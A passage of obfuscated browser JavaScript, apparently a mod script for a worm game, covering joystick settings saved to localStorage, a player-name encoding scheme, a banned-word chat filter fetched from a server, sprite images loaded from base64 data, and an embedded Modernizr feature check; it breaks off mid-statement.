      var _0x4bde2c = navigator.userAgent || navigator.vendor || window.opera;
      if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(_0x4bde2c) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(_0x4bde2c.substr(0, 4))) {
        _0x407d4a = true;
        _0x207b06.mobile = true;
      }
      return _0x407d4a;
    };
    let _0x153895 = function (_0x202528) {
      _0x207b06.joystick ||= _0x5c2dcc.joystick;
      _0x207b06.joystick.checked = _0x202528.checked;
      localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
    };
    let _0x31aafd = function (_0x1088a7) {
      _0x207b06.joystick ||= _0x5c2dcc.joystick;
      _0x207b06.joystick.color = _0x1088a7.value;
      localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
    };
    let _0x1aaa19 = function (_0xa5b80e) {
      _0x207b06.joystick ||= _0x5c2dcc.joystick;
      _0x207b06.joystick.mode = _0xa5b80e.value;
      localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
    };
    let _0x15cb63 = function (_0x14746d) {
      _0x207b06.joystick ||= _0x5c2dcc.joystick;
      _0x207b06.joystick.position = {
        left: "75px",
        bottom: "75px"
      };
      if (_0x14746d.value === "R") {
        _0x207b06.joystick.position = {
          right: "75px",
          bottom: "75px"
        };
      }
      _0x207b06.joystick.positionMode = _0x14746d.value;
      localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
    };
    let _0x3dfdfb = function (_0x56e7a9) {
      _0x207b06.joystick ||= _0x5c2dcc.joystick;
      _0x207b06.joystick.position = {
        left: (parseInt(_0x56e7a9.value) + 10).toString() + "px",
        bottom: _0x56e7a9.value + "px"
      };
      if (_0x207b06.joystick.positionMode === "R") {
        _0x207b06.joystick.position = {
          right: (parseInt(_0x56e7a9.value) + 10).toString() + "px",
          bottom: _0x56e7a9.value + "px"
        };
      }
      _0x207b06.joystick.pxy = _0x56e7a9.value;
      localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
    };
    let _0x2b5b6e = function (_0x568d8c) {
      _0x207b06.joystick ||= _0x5c2dcc.joystick;
      _0x207b06.joystick.size = _0x568d8c.value;
      localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
    };
    let _0x1e50f1 = function (_0x248aa6, _0x726590, _0x3cf265, _0x48bd99, _0x20e79e, _0x13d743) {
      let _0x294ee0 = {
        a: "",
        b: 0,
        c: ""
      };
      if (_0x248aa6 > _0x207b06.g * 100 + 100 || _0x248aa6 < _0x207b06.g * 10 || _0x248aa6 === undefined) {
        _0x207b06.a = _0x248aa6;
        if (_0x248aa6 === undefined) {
          _0x207b06.a = Math.floor(Math.random() * (_0x207b06.g / 9) + (_0x207b06.g - _0x207b06.g / 9));
        }
        _0x294ee0.a = "00";
      } else {
        _0x207b06.a = _0x248aa6 - _0x207b06.g * 10;
        _0x294ee0.b = _0x207b06.a;
        _0x207b06.a = _0x207b06.a % (_0x207b06.g / 9);
        _0x294ee0.b = (_0x294ee0.b - _0x207b06.a) / (_0x207b06.g / 9) + 1;
        _0x207b06.a = _0x207b06.a + (_0x207b06.g - _0x207b06.g / 9);
        _0x294ee0.a = _0x294ee0.b.toString(_0x207b06.g).padStart(2, 0);
      }
      if (_0x726590 > _0x207b06.g * 20 || _0x726590 < _0x207b06.g / 9 * 100 || _0x726590 === undefined) {
        if (_0x726590 > _0x207b06.g * 20 && _0x726590 < _0x207b06.g * 30) {
          _0x207b06.b = _0x726590 - _0x207b06.g * 20;
          _0x294ee0.a = _0x294ee0.a + _0x207b06.b.toString(_0x207b06.g);
          _0x207b06.b = 0;
          _0x294ee0.c = _0x294ee0.c + "1";
        } else {
          _0x207b06.b = _0x726590;
          if (_0x726590 === undefined) {
            _0x207b06.b = 0;
          }
          _0x294ee0.a = _0x294ee0.a + "0";
          _0x294ee0.c = _0x294ee0.c + "0";
        }
      } else {
        _0x207b06.b = _0x726590 - _0x207b06.g / 9 * 100 + _0x207b06.g / _0x207b06.g;
        _0x294ee0.a = _0x294ee0.a + _0x207b06.b.toString(_0x207b06.g);
        _0x207b06.b = 0;
        _0x294ee0.c = _0x294ee0.c + "0";
      }
      if (_0x3cf265 > _0x207b06.g * 20 || _0x3cf265 < _0x207b06.g / 9 * 100 || _0x3cf265 === undefined) {
        if (_0x3cf265 > _0x207b06.g * 20 && _0x3cf265 < _0x207b06.g * 30) {
          _0x207b06.c = _0x3cf265 - _0x207b06.g * 20;
          _0x294ee0.a = _0x294ee0.a + _0x207b06.c.toString(_0x207b06.g);
          _0x207b06.c = 0;
          _0x294ee0.c = _0x294ee0.c + "1";
        } else {
          _0x207b06.c = _0x3cf265;
          if (_0x3cf265 === undefined) {
            _0x207b06.c = 0;
          }
          _0x294ee0.a = _0x294ee0.a + "0";
          _0x294ee0.c = _0x294ee0.c + "0";
        }
      } else {
        _0x207b06.c = _0x3cf265 - _0x207b06.g / 9 * 100 + _0x207b06.g / _0x207b06.g;
        _0x294ee0.a = _0x294ee0.a + _0x207b06.c.toString(_0x207b06.g);
        _0x207b06.c = 0;
        _0x294ee0.c = _0x294ee0.c + "0";
      }
      if (_0x48bd99 > _0x207b06.g * 20 || _0x48bd99 < _0x207b06.g / 9 * 100 || _0x48bd99 === undefined) {
        if (_0x48bd99 > _0x207b06.g * 20 && _0x48bd99 < _0x207b06.g * 30) {
          _0x207b06.d = _0x48bd99 - _0x207b06.g * 20;
          if (_0x207b06.d.toString(_0x207b06.g) === "N") {
            _0x294ee0.a = _0x294ee0.a + "0";
          } else {
            _0x294ee0.a = _0x294ee0.a + _0x207b06.d.toString(_0x207b06.g);
          }
          _0x207b06.d = 0;
          _0x294ee0.c = _0x294ee0.c + "1";
        } else {
          _0x207b06.d = _0x48bd99;
          if (_0x48bd99 === undefined) {
            _0x207b06.d = 0;
          }
          _0x294ee0.a = _0x294ee0.a + "0";
          _0x294ee0.c = _0x294ee0.c + "0";
        }
      } else {
        _0x207b06.d = _0x48bd99 - _0x207b06.g / 9 * 100 + _0x207b06.g / _0x207b06.g;
        if (_0x207b06.d.toString(_0x207b06.g) === "N") {
          _0x294ee0.a = _0x294ee0.a + "0";
        } else {
          _0x294ee0.a = _0x294ee0.a + _0x207b06.d.toString(_0x207b06.g);
        }
        _0x207b06.d = 0;
        _0x294ee0.c = _0x294ee0.c + "0";
      }
      if (_0x20e79e > _0x207b06.g * 20 || _0x20e79e < _0x207b06.g / 9 * 100 || _0x20e79e === undefined) {
        if (_0x20e79e > _0x207b06.g * 20 && _0x20e79e < _0x207b06.g * 30) {
          _0x294ee0.b = _0x207b06.g / _0x207b06.g;
          if (_0x20e79e <= _0x207b06.g * 20 + (_0x207b06.g - 1)) {
            _0x207b06.e = _0x20e79e - _0x207b06.g * 20;
          } else if (_0x20e79e <= _0x207b06.g * 20 + (_0x207b06.g - 1) * 2) {
            _0x294ee0.b = _0x294ee0.b * 2;
            _0x207b06.e = _0x20e79e - _0x207b06.g * 20 - (_0x207b06.g - 1);
          } else if (_0x20e79e <= _0x207b06.g * 20 + (_0x207b06.g - 1) * 3) {
            _0x207b06.e = _0x20e79e - _0x207b06.g * 20 - (_0x207b06.g - 1) * 2;
          } else if (_0x20e79e <= _0x207b06.g * 20 + (_0x207b06.g - 1) * 4) {
            _0x294ee0.b = _0x294ee0.b * 2;
            _0x207b06.e = _0x20e79e - _0x207b06.g * 20 - (_0x207b06.g - 1) * 3;
          } else {
            _0x207b06.e = 0;
          }
          if (_0x207b06.e >= _0x207b06.g) {
            _0x294ee0.b = 2;
            _0x207b06.e = _0x207b06.e - (_0x207b06.g - 1);
          }
          _0x294ee0.a = _0x294ee0.a + _0x207b06.e.toString(_0x207b06.g);
          _0x207b06.e = 0;
          _0x294ee0.c = _0x294ee0.c + "1";
        } else {
          _0x207b06.e = _0x20e79e;
          if (_0x20e79e === undefined) {
            _0x207b06.e = 0;
          }
          _0x294ee0.a = _0x294ee0.a + "0";
          _0x294ee0.c = _0x294ee0.c + "0";
          _0x294ee0.b = 0;
        }
      } else {
        _0x294ee0.b = _0x207b06.g / _0x207b06.g;
        if (_0x20e79e - _0x207b06.g / 9 * 100 + 1 >= _0x207b06.g) {
          _0x207b06.e = _0x20e79e - (_0x207b06.g / 9 * 100 + (_0x207b06.g - 1));
          _0x294ee0.b = _0x294ee0.b * 2;
        } else {
          _0x207b06.e = _0x20e79e - _0x207b06.g / 9 * 100 + _0x294ee0.b;
        }
        _0x294ee0.a = _0x294ee0.a + _0x207b06.e.toString(_0x207b06.g);
        _0x207b06.e = 0;
        _0x294ee0.c = _0x294ee0.c + "0";
      }
      if (_0x294ee0.a == "000000") {
        _0x207b06.f = _0x13d743.substr(0, 22).padEnd(22);
      } else {
        let _0xaf9871 = parseInt(_0x294ee0.c, 2);
        if (_0x20e79e > 790 && _0x20e79e <= 860) {
          _0xaf9871 += 16;
        }
        if (_0x294ee0.b <= 1) {
          _0x294ee0.a = _0x294ee0.a.substr(0, 5) + "|" + _0x294ee0.a.substr(5, 1);
        } else {
          _0x294ee0.a = _0x294ee0.a.substr(0, 4) + "|" + _0x294ee0.a.substr(4, 2);
        }
        if (_0x13d743 == "") {
          _0x13d743 = ".                       .";
        }
        if (_0x294ee0.c == "0000") {
          if (_0x13d743.substr(23, 1) == ".") {
            _0x13d743 = _0x13d743.substr(0, 23).padEnd(23) + " " + _0x13d743.substr(24, 1).padEnd(1);
          }
          _0x207b06.f = (_0x13d743.length >= 32 ? _0x13d743.substr(0, 25) : _0x13d743.substr(0, 25).padEnd(25)) + _0x294ee0.a;
        } else {
          _0x207b06.f = (_0x13d743.length >= 32 ? _0x13d743.substr(0, 23) : _0x13d743.substr(0, 23).padEnd(23)) + "." + _0xaf9871.toString(_0x207b06.g) + _0x294ee0.a;
        }
        _0x207b06.f = _0x207b06.f.replaceAll(" ", "_");
      }
    };
    let _0x431976 = function (_0x153ac1) {
      let _0x5b2764;
      try {
        _0x207b06.joystick ||= _0x5c2dcc.joystick;
        if (_0x2964bf() && _0x153ac1 && _0x207b06.joystick.checked) {
          (_0x5b2764 = nipplejs.create(_0x207b06.joystick)).on("move", function (_0xfd5ad4, _0xbc375f) {
            _0x5c2dcc.eie.fo = _0xbc375f.angle.radian <= Math.PI ? _0xbc375f.angle.radian * -1 : Math.PI - (_0xbc375f.angle.radian - Math.PI);
          });
        }
        return _0x5b2764;
      } catch (_0x617383) {
        console.error(_0x617383);
      }
    };
    let _0x3dc122 = function (_0x343f7e) {
      let _0x2a698e = {
        a: 0,
        b: 0,
        c: 0,
        d: 0,
        e: 0,
        f: "",
        g: 0,
        h: "",
        i: ""
      };
      let _0x2c396c = 0;
      _0x2a698e.h = _0x343f7e.substr(-9);
      if (_0x2a698e.h.substr(0, 1) != ".") {
        _0x2a698e.i = "0000";
      } else if ((_0x2c396c = parseInt(_0x2a698e.h.substr(1, 1), _0x207b06.g)) > 15) {
        _0x2c396c -= 16;
        _0x2a698e.i = _0x2c396c.toString(2).padStart(4, 0);
      } else {
        _0x2a698e.i = _0x2c396c.toString(2).padStart(4, 0);
        _0x2c396c = 0;
      }
      _0x2a698e.f = _0x343f7e.substr(-7);
      if (_0x2a698e.f.substr(0, 2) != "00") {
        _0x2a698e.a = parseInt(_0x2a698e.f.substr(0, 2), _0x207b06.g);
        _0x2a698e.a = (_0x2a698e.a - 1) * (_0x207b06.g / 9) + _0x207b06.g * 10 - (_0x207b06.g - 4);
      }
      if (_0x2a698e.f.substr(5, 1) == "|") {
        if (_0x2a698e.f.substr(6, 1) != "0") {
          _0x2a698e.e = parseInt(_0x2a698e.f.substr(6, 1), _0x207b06.g);
          if (_0x2a698e.i.substr(3, 1) != "0") {
            if (_0x2c396c > 0) {
              _0x2a698e.e = _0x2a698e.e + _0x207b06.g * 20 + (_0x207b06.g - 1) * 2;
            } else {
              _0x2a698e.e = _0x2a698e.e + _0x207b06.g * 20;
            }
          } else {
            _0x2a698e.e = _0x2a698e.e - 1 + _0x207b06.g / 9 * 100;
          }
        }
      } else {
        _0x2a698e.e = parseInt(_0x2a698e.f.substr(6, 1), _0x207b06.g);
        if (_0x2a698e.i.substr(3, 1) != "0") {
          if (_0x2c396c > 0) {
            _0x2a698e.e = _0x2a698e.e + _0x207b06.g * 20 + (_0x207b06.g - 1) * 3;
          } else {
            _0x2a698e.e = _0x2a698e.e + _0x207b06.g * 20 + (_0x207b06.g - 1);
          }
        } else {
          _0x2a698e.e = _0x2a698e.e + (_0x207b06.g / 9 * 100 + (_0x207b06.g - 1));
        }
      }
      _0x2a698e.f = _0x2a698e.f.replace("|", "");
      if (_0x2a698e.f.substr(2, 1) != "0") {
        _0x2a698e.b = parseInt(_0x2a698e.f.substr(2, 1), _0x207b06.g);
        if (_0x2a698e.i.substr(0, 1) != "0") {
          _0x2a698e.b = _0x2a698e.b + _0x207b06.g * 20;
        } else {
          _0x2a698e.b = _0x2a698e.b - 1 + _0x207b06.g / 9 * 100;
        }
      }
      if (_0x2a698e.f.substr(3, 1) != "0") {
        _0x2a698e.c = parseInt(_0x2a698e.f.substr(3, 1), _0x207b06.g);
        if (_0x2a698e.i.substr(1, 1) != "0") {
          _0x2a698e.c = _0x2a698e.c + _0x207b06.g * 20;
        } else {
          _0x2a698e.c = _0x2a698e.c - 1 + _0x207b06.g / 9 * 100;
        }
      }
      if (_0x2a698e.f.substr(4, 1) != "0") {
        _0x2a698e.d = parseInt(_0x2a698e.f.substr(4, 1), _0x207b06.g);
        if (_0x2a698e.i.substr(2, 1) != "0") {
          _0x2a698e.d = _0x2a698e.d + _0x207b06.g * 20;
        } else {
          _0x2a698e.d = _0x2a698e.d - 1 + _0x207b06.g / 9 * 100;
        }
      }
      return _0x2a698e;
    };
    let _0xa2a78e = function (_0x1048cd) {
      return !(_0x1048cd > _0x207b06.g * 30) && !(_0x1048cd < _0x207b06.g / 9 * 100) || _0x1048cd == 0;
    };
    let _0x15b640 = function (_0x5fa320) {
      return /^(.{25})(\w{5}\|\w{1})$/.test(_0x5fa320) || /^(.{25})(\w{4}\|\w{2})$/.test(_0x5fa320);
    };
    let _0x20533a = function (_0x51d83c) {
      _0x51d83c = _0x51d83c.replaceAll("_", " ");
      let _0x3cfa83 = _0x51d83c;
      if (/^(.{25})(\w{7})$/.test(_0x51d83c)) {
        for (_0x51d83c = _0x51d83c.substr(0, 15).trim(); _0x51d83c.substr(_0x51d83c.length - 1, 1) == ".";) {
          _0x51d83c = _0x51d83c.substr(0, _0x51d83c.length - 1);
        }
        _0x3cfa83 = _0x51d83c;
      } else if (/^(.{25})(\w{5}\|\w{1})$/.test(_0x51d83c) || /^(.{25})(\w{4}\|\w{2})$/.test(_0x51d83c)) {
        if (_0x51d83c.substr(-9).substr(0, 1) != ".") {
          _0x3cfa83 = _0x51d83c.substr(0, 25).trim();
        } else {
          _0x3cfa83 = _0x51d83c.substr(0, 23).trim();
        }
      }
      return _0x3cfa83;
    };
    function _0x31650d(_0x1e3d93, _0x319529 = false) {
      if (_0x319529 || _0x207b06.bannedWordsEnabled && _0x207b06.bannedWords && _0x207b06.bannedWords.length > 0) {
        let _0x2bf9f3 = _0x1e3d93.replace(/[0-9*_\-\s\u064B-\u065F\u0640\u06D4]/g, "").replace(/[أإآ]/g, "ا").replace(/[ؤ]/g, "و").replace(/[ئ]/g, "ي").replace(/[ة]/g, "ه").replace(/[s$]/gi, "س").replace(/[k]/gi, "ك").replace(/[g]/gi, "غ").replace(/[z]/gi, "ز").replace(/[x]/gi, "ك").replace(/[c]/gi, "س").replace(/[v]/gi, "ف").replace(/[b]/gi, "ب").replace(/[n]/gi, "ن").replace(/[m]/gi, "م").replace(/[r]/gi, "ر").replace(/[t]/gi, "ت").replace(/[y]/gi, "ي").replace(/[a]/gi, "ا").replace(/[e]/gi, "ع").replace(/[h]/gi, "ه").replace(/[w]/gi, "و").replace(/[d]/gi, "د").replace(/[f]/gi, "ف").replace(/[l]/gi, "ل").replace(/[j]/gi, "ج").replace(/[p]/gi, "ب").replace(/[q]/gi, "ق").replace(/[ڬ]/g, "ك").replace(/[چ]/g, "ج").replace(/[پ]/g, "ب").replace(/[ژ]/g, "ز").replace(/[گ]/g, "ك").replace(/[ڤ]/g, "ف").replace(/[ڪ]/g, "ك").replace(/[ں]/g, "ن").replace(/[ۃ]/g, "ه").replace(/[ی]/g, "ي").replace(/[٠-٩]/g, "").replace(/[\u200B-\u200D\uFEFF]/g, "").toLowerCase();
        for (let _0x19d756 of _0x207b06.bannedWords) {
          if (_0x19d756) {
            let _0x2f55a7 = _0x19d756.replace(/[أإآ]/g, "ا").replace(/[ؤ]/g, "و").replace(/[ئ]/g, "ي").replace(/[ة]/g, "ه").toLowerCase();
            if (_0x2bf9f3.includes(_0x2f55a7)) {
              return "أن الله يراك";
            }
          }
        }
      }
      return _0x1e3d93;
    }
    let _0x420199 = function () {
      fetch(_0x207b06.s_l + "/words").then(_0x1d6f04 => {
        if (!_0x1d6f04.ok) {
          throw new Error("HTTP error! status: " + _0x1d6f04.status);
        }
        return _0x1d6f04.json();
      }).then(_0x52a251 => {
        if (Array.isArray(_0x52a251)) {
          _0x207b06.bannedWords = _0x52a251;
          localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
        } else {
          console.warn("⚠️ البيانات المستلمة ليست مصفوفة:", _0x52a251);
          _0x207b06.bannedWords = [];
        }
      }).catch(_0xa2e9c4 => {
        console.error("❌ خطأ في تحميل الكلمات المحظورة:", _0xa2e9c4);
        _0x207b06.bannedWords = [];
      });
    };
    _0x207b06.loading = true;
    _0x420199();
    var _0x251a97 = localStorage.getItem("oco");
    localStorage.setItem("ccg_0", "Kill and Headshot stats will be removed?");
    localStorage.setItem("ccg_1", "There was a problem connecting!");
    localStorage.setItem("ccg_2", "Your account has been locked.");
    var _0x1b3b43 = localStorage.getItem("wupsw");
    var _0x56e2a2 = localStorage.getItem("wupi") != null ? localStorage.getItem("wupi").split(",") : localStorage.getItem("wupi");
    var _0x1c421d = localStorage.getItem("wupit");
    var _0x3ca2a7 = localStorage.getItem("custom_wear");
    var _0x2f2e61 = localStorage.getItem("custom_skin");
    $("<input type=\"hidden\" id=\"port_id\" value=\"\">").insertAfter(".description-text");
    $("<input type=\"hidden\" id=\"port_id_s\" value=\"\">").insertAfter(".description-text");
    $("<input type=\"hidden\" id=\"port_name\" value=\"\">").insertAfter(".description-text");
    $("<input type=\"hidden\" id=\"port_name_s\" value=\"\">").insertAfter(".description-text");
    $("#mm-action-buttons").hover(function () {
      $("#port_id").val("");
      $("#port_name").val("");
    });
    var _0x1fe842 = $("<img>", {
      id: "orange-frame",
      src: "https://wormup.in/images/img/orange-frame.png",
      alt: "orange-frame"
    });
    $("#mm-player-avatar").after(_0x1fe842);
    $("#orange-frame").addClass("position-left");
    $("#mm-player-info").css("display", "block");
    $("#relojHelp").css("position", "absolute");
    $("#relojHelp").css("top", "12px");
    $("#relojHelp").css("left", "5px");
    $("#delete-account-view").css("display", "none");
    var _0x18dfde = null;
    var _0x8a94c9 = null;
    var _0x33e15a = false;
    var _0x38aca6 = 55;
    var _0xb42c97 = 1;
    var _0x13b8e7 = true;
    if (_0x56e2a2 && _0x1c421d && _0x1c421d == _0x207b06.v_z) ;else {
      fetch(_0x207b06.s_l + "/store", {
        headers: {
          "Content-Type": "application/json"
        },
        method: "POST",
        body: JSON.stringify({
          img: "i2"
        })
      }).then(async function (_0x45d7d0) {
        _0x56e2a2 = (_0x45d7d0 = await _0x45d7d0.json()).i.split(".");
        localStorage.setItem("wupi", _0x56e2a2);
        localStorage.setItem("wupit", _0x45d7d0.vs);
        _0x207b06.v_z = _0x45d7d0.vs;
        localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
        window.location.reload();
      }).catch(function (_0x3ad7e2) {});
    }
    ;
    var _0x548fe1 = PIXI.Texture.from(atob(_0x56e2a2[0]));
    var _0x1a4670 = PIXI.Texture.from(atob(_0x56e2a2[1]));
    var _0x4de304 = PIXI.Texture.from(atob(_0x56e2a2[2]));
    var _0x80766b = PIXI.Texture.from(atob(_0x56e2a2[3]));
    var _0x4e187f = PIXI.Texture.from(atob(_0x56e2a2[4]));
    var _0x6c8187 = PIXI.Texture.from(atob(_0x56e2a2[5]));
    var _0x412467 = PIXI.Texture.from(atob(_0x56e2a2[6]));
    var _0x51ff07 = PIXI.Texture.from(atob(_0x56e2a2[7]));
    var _0xfa7e1 = new PIXI.Sprite(_0x548fe1);
    _0xfa7e1.buttonMode = true;
    _0xfa7e1.anchor.set(0.5);
    _0xfa7e1.x = -65;
    _0xfa7e1.y = 25;
    _0xfa7e1.interactive = true;
    _0xfa7e1.buttonMode = true;
    var _0x2e32b4 = new PIXI.Sprite(_0x4de304);
    _0x2e32b4.buttonMode = true;
    _0x2e32b4.anchor.set(0.5);
    _0x2e32b4.x = -33;
    _0x2e32b4.y = 25;
    _0x2e32b4.interactive = true;
    _0x2e32b4.buttonMode = true;
    var _0x314f33 = new PIXI.Sprite(_0x4e187f);
    _0x314f33.buttonMode = true;
    _0x314f33.anchor.set(0.5);
    _0x314f33.x = -1;
    _0x314f33.y = 25;
    _0x314f33.interactive = true;
    _0x314f33.buttonMode = true;
    var _0x1e6f48 = new PIXI.Sprite(_0x51ff07);
    _0x1e6f48.buttonMode = true;
    _0x1e6f48.anchor.set(0.5);
    _0x1e6f48.x = -1;
    _0x1e6f48.y = 25;
    _0x1e6f48.interactive = true;
    _0x1e6f48.buttonMode = true;
    var _0xb5f074 = new PIXI.Sprite(_0x412467);
    _0xb5f074.buttonMode = true;
    _0xb5f074.anchor.set(0.5);
    _0xb5f074.x = -33;
    _0xb5f074.y = 25;
    _0xb5f074.interactive = true;
    _0xb5f074.buttonMode = true;
    _0x2e32b4.alpha = 0.25;
    _0xfa7e1.alpha = 0.25;
    _0x314f33.alpha = 0.25;
    _0xb5f074.alpha = 0.25;
    _0x1e6f48.alpha = 0.25;
    var _0x322fdb = new PIXI.Text("?", {
      fontFamily: "PTSans",
      fill: "#fff009",
      fontSize: 12
    });
    _0x322fdb.anchor.x = 0.5;
    _0x322fdb.position.x = 110;
    var _0x41ed0b = document.getElementById("game-cont");
    var _0x7a9760 = document.getElementById("game-view");
    var _0x2e59c9 = $("#mm-params-game-mode");
    _0x7f096e.d.getElementById("game-wrap").style.display = "block";
    (function (_0x26108a, _0xe52c0, _0x23c96b) {
      function _0x5dfff7(_0x2e3275, _0x1d38d2) {
        return _typeof(_0x2e3275) === _0x1d38d2;
      }
      function _0x5737d9() {
        if (_typeof(_0xe52c0.createElement) != "function") {
          return _0xe52c0.createElement(arguments[0]);
        } else if (_0x1fd3e2) {
          return _0xe52c0.createElementNS.call(_0xe52c0, "http://www.w3.org/2000/svg", arguments[0]);
        } else {
          return _0xe52c0.createElement.apply(_0xe52c0, arguments);
        }
      }
      var _0x2b4613 = [];
      var _0x21b210 = [];
      var _0xf6307 = {
        _version: "3.3.1",
        _config: {
          classPrefix: "",
          enableClasses: true,
          enableJSClass: true,
          usePrefixes: true
        },
        _q: [],
        on: function (_0x273de7, _0x46150c) {
          var _0x199104 = this;
          setTimeout(function () {
            _0x46150c(_0x199104[_0x273de7]);
          }, 0);
        },
        addTest: function (_0x298137, _0x399e0b, _0x2436d9) {
          _0x21b210.push({
            name: _0x298137,
            fn: _0x399e0b,
            options: _0x2436d9
          });
        },
        addAsyncTest: function (_0x227fe7) {
          _0x21b210.push({
            name: null,
            fn: _0x227fe7
          });
        }
      };
      function _0x486455() {}
      _0x486455.prototype = _0xf6307;
      _0x486455 = new _0x486455();
      var _0x4c6f47 = false;
      try {
        _0x4c6f47 = "WebSocket" in _0x26108a && _0x26108a.WebSocket.CLOSING === 2;
      } catch (_0x4a34f0) {}
      ;
      _0x486455.addTest("websockets", _0x4c6f47);
      var _0x2584da = _0xe52c0.documentElement;
      var _0x1fd3e2 = _0x2584da.nodeName.toLowerCase() === "svg";
      _0x486455.addTest("canvas", function () {
        var _0x19961a = _0x5737d9("canvas");
        return !!_0x19961a.getContext && !!_0x19961a.getContext("2d");
      });
      _0x486455.addTest("canvastext", function () {
        return _0x486455.canvas !== false && _typeof(_0x5737d9("canvas").getContext("2d").fillText) == "function";
      });
      (function () {
        var _0x6e37d;
        var _0x283ed3;
        var _0x27cda2;
        var _0x5f463c;
        var _0x30107a;
        var _0x54c074;
        var _0x1b36e6;
        for (var _0x3eb28a in _0x21b210) {
          if (_0x21b210.hasOwnProperty(_0x3eb28a)) {
            _0x6e37d = [];
            if ((_0x283ed3 = _0x21b210[_0x3eb28a]).name && (_0x6e37d.push(_0x283ed3.name.toLowerCase()), _0x283ed3.options && _0x283ed3.options.aliases && _0x283ed3.options.aliases.length)) {
              for (_0x27cda2 = 0; _0x27cda2 < _0x283ed3.options.aliases.length; _0x27cda2++) {
                _0x6e37d.push(_0x283ed3.options.aliases[_0x27cda2].toLowerCase());
              }
            }
            ;
            _0x5f463c = _0x5dfff7(_0x283ed3.fn, "function") ? _0x283ed3.fn() : _0x283ed3.fn;
            _0x30107a = 0;
            for (; _0x30107a < _0x6e37d.length; _0x30107a++) {
              if ((_0x1b36e6 = (_0x54c074 = _0x6e37d[_0x30107a]).split(".")).length === 1) {
                _0x486455[_0x1b36e6[0]] = _0x5f463c;
              } else {
                if (!!_0x486455[_0x1b36e6[0]] && !(_0x486455[_0x1b36e6[0]] instanceof Boolean)) {
                  _0x486455[_0x1b36e6[0]] = new Boolean(_0x486455[_0x1b36e6[0]]);
                }
                _0x486455[_0x1b36e6[0]][_0x1b36e6[1]] = _0x5f463c;
              }
              _0x2b4613.push((_0x5f463c ? "" : "no-") + _0x1b36e6.join("-"));
            }
          }
        }
      })();
      (function (_0x5daaba) {
        var _0x2aa330 = _0x2584da.className;
        var _0x31078f = _0x486455._config.classPrefix || "";
        if (_0x1fd3e2) {
          _0x2aa330 = _0x2aa330.baseVal;
        }
        if (_0x486455._config.enableJSClass) {
          var _0x4b20b6 = RegExp("(^|\\s)" + _0x31078f + "no-js(\\s|$)");
          _0x2aa330 = _0x2aa330.replace(_0x4b20b6, "$1" + _0x31078f + "js$2");
        }
        ;
        if (_0x486455._config.enableClasses) {
          _0x2aa330 += " " + _0x31078f + _0x5daaba.join(" " + _0x31078f);
          if (_0x1fd3e2) {
            _0x2584da.className.baseVal = _0x2aa330;
          } else {
            _0x2584da.className = _0x2aa330;
          }
        }
      })(_0x2b4613);
      delete _0xf6307.addTest;
      delete _0xf6307.addAsyncTest;
      for (var _0xb62fb4 = 0; _0xb62fb4 < _0x486455._q.length; _0xb62fb4++) {
        _0x486455._q[_0xb62fb4]();
      }
      ;
      _0x26108a.Modernizr = _0x486455;
    })(window, document);
    if (!Modernizr.websockets || !Modernizr.canvas || !Modernizr.canvastext) {
